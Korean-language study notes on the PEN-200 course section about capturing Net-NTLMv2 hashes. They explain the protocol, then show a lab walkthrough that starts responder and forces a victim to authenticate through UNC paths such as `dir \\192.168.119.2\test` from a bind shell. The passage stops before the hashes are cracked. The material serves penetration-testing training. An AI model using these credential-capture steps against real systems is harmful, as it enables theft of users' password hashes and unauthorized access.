# 16.3.3 Net-NTLMv2 크래킹

> **Cracking Net-NTLMv2** · PEN-200 §16.3.3

비특권 사용자로 코드 실행이나 셸만 얻은 상황이면 Mimikatz 로 패스워드·NTLM 해시를 뽑을 수 없음. 이때 노리는 것이 **Net-NTLMv2** — Windows 클라이언트와 서버 사이의 네트워크 인증을 관장하는 프로토콜임. (정확한 명칭은 NTLMv2 지만 교재는 업계 관용인 Net-NTLMv2 를 씀)

흐름은 챌린지·응답임. 클라이언트가 접속 조건을 담은 요청을 보내면 서버가 챌린지를 돌려주고, 클라이언트는 자기 NTLM 해시로 응답 데이터를 암호화해 신원을 증명하며, 서버가 그 응답을 검증해 허용·거부함. Kerberos 보다 낡고 덜 안전하지만, Kerberos 를 지원하지 않는 구형 장비를 떠안느라 대다수 Windows 환경에 여전히 살아 있음 — 그래서 약점을 아는 것이 필수임.

**공격의 발상은 하나 — 대상이 «우리가 통제하는 시스템»을 상대로 인증을 시작하게 만드는 것.** 그러면 그 과정에서 쓰인 Net-NTLMv2 해시를 우리가 보게 됨. `responder` 가 이 역할을 함: 내장 SMB 서버로 인증 절차를 대신 처리하고 잡힌 해시를 출력함. HTTP·FTP 서버와 LLMNR·NBT-NS·MDNS 포이즈닝(MITRE T1557) 기능도 들었지만 이 절은 SMB 서버만 씀.

**인증을 유발하는 수단은 코드 실행 유무로 갈림.**
- 코드 실행이 있으면 — PowerShell 에서 `ls \\192.168.119.2\share` 한 줄이면 충분함
- 없어도 길이 있음 — 예컨대 Windows 서버의 웹 파일 업로드 폼에 존재하지 않는 UNC 경로(`\\192.168.119.2\share\nonexistent.txt`)를 넣어 봄. 그 애플리케이션이 SMB 업로드를 지원하면 서버 쪽이 우리 SMB 서버로 인증하러 옴

실습 — FILES01(192.168.50.211)의 바인드 셸(4444)에 Netcat 으로 붙어 `whoami` 하면 `files01\paul` 이고, `net user paul` 로 보면 로컬 Administrators 가 아니라 Remote Desktop Users 소속임. 즉 Mimikatz 는 못 쓰지만 RDP 는 붙을 수 있는 계정이라, 크래킹이 성공하면 곧바로 검증할 수단이 있음.

Kali 쪽은 `ip a` 로 인터페이스를 확인한 뒤 `sudo responder -I tap0` 로 띄움 — 여러 프로토콜의 특권 raw 소켓을 다뤄야 해서 `sudo` 가 필요하고, `-I` 뒤 인터페이스 이름은 환경마다 다름. 기동 출력에 `SMB server [ON]` 과 `Listening for events...` 가 보이면 준비된 것임.

그 상태에서 바인드 셸로 돌아가 **존재하지 않는 공유**를 조회함. 공유 목록을 얻는 게 목적이 아니라 인증을 일으키는 게 목적이므로 이름은 임의로 지어도 됨.
```
C:\Windows\system32>dir \\192.168.119.2\test
dir \\192.168.119.2\test

```
